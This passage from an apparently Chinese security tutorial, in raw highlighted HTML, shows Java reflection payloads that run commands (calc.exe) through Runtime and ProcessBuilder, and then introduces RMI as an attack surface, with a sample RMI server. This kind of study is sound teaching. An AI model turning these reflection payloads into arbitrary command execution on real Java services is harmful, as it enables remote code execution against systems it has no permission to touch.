&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runtime&lt;/span> &lt;span style="color:#111">rt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Process&lt;/span> &lt;span style="color:#111">ps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">rt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;error here&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="getmethodinvoke">getMethod&amp;amp;invoke&lt;/h3>
&lt;p>&lt;code>Class.newInstance&lt;/code>调用的是该类的public无参构造函数，而有参数的构造方法 或非&lt;code>public&lt;/code>的构造方法都无法通过&lt;code>Class.newInstance()&lt;/code>调用，比如&lt;code>Runtime&lt;/code>的构造方法就是私有的（单例模式），下面的栗子就无法执行&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>鉴于此，我们可以通过&lt;code>Runtime.getRuntime&lt;/code>获取到&lt;code>Runtime&lt;/code>对象，这里指定的重载为最简单的&lt;code>exec&lt;/code>，依旧是通过invoke调用：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>invoke&lt;/code>作用是执行方法，如果这个方法是普通方法，那么第一个参数是类对象；如果是静态方法，那么第一个参数是类，上面的payload相当于&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">execMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">getRuntimeMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">runtime&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getRuntimeMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">execMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">runtime&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>另一个API是&lt;code>getDeclaredMethod&lt;/code>，获取当前类声明的所有方法（不包括从父类继承来的方法 包含当前类的私有方法），结合这一点，我们也可以通过这个api获取到&lt;code>Runtime&lt;/code>对象并调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意必须同时设置&lt;code>setAccessible(true)&lt;/code>修改作用域&lt;/p>
&lt;h3 id="getconstructor">getConstructor&lt;/h3>
&lt;p>当一个类没有public的无参构造方法时，我们可以首先用&lt;code>getConstructor&lt;/code>获取到构造函数（需要传入参数类型 因为可以有多种构造函数），之后用&lt;code>newInstance&lt;/code>实例化对象，再经过强制类型转换后用&lt;code>start&lt;/code>执行；这里用ProcessBuilder作示例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">ProcessBuilder&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">))).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果目标环境没有强制类型转换时，我们可以再次借助反射&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先获取到&lt;code>start&lt;/code>方法，然后&lt;code>invoke&lt;/code>执行，invoke 的第一个参数就是ProcessBuilder Object，逻辑也是很顺的：先获取要执行的方法，然后传入执行的参数&lt;/p>
&lt;p>如果要使用ProcessBuilder的另一个重载（参数为可变长参数String&amp;hellip; command 相当于数组），可以这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">ProcessBuilder&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[][]{{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}})).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rmi">RMI&lt;/h2>
&lt;p>即Remote Method Invocation，不让它RCE都对不起这个R&lt;/p>
&lt;h3 id="通信实现">通信实现&lt;/h3>
&lt;p>Server编写实现类并注册为服务createRegistry，Client查找服务并获得接口实例getRegistry，两者共享相同的接口interface&lt;/p>
&lt;p>当Client连接时，首先连接Registry并寻找想要的对象，发送Call消息；之后Server返回对象（序列化数据），ReturnData消息；Client收到后反序列化得到远程对象，与其建立TCP连接，在这个新的连接中才会在Server端执行方法调用&lt;/p>
&lt;p>可以直接通过rmi://xxx:xxx/这样的地址获取所有绑定的对象（直通RMI Registry后台&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://ip:port&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于rebind, bind, unbind这样的危险方法只有当来源是locahost才行，远程用不了&lt;/p>
&lt;p>对于反序列化数据，可以用&lt;a href="https://github.com/NickstaDB/SerializationDumper/releases/">SerializationDumper&lt;/a>进行分析，用wireshark 复制-&amp;gt; as a hex Stream&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -jar SerializationDumper-v1.1.jar &lt;span style="color:#d88200">&amp;#34;deadbeaf&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html&lt;/a>&lt;/p>
&lt;p>一个简单的rmiserver&amp;amp;rmiclient的栗子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.server.UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RMIServer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">IRemoteHelloWorld&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RemoteHelloWorld&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">IRemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#75af00">RemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;call from&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello world&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">RemoteHelloWorld&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">9092&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://127.0.0.1:9092/Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RMIServer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
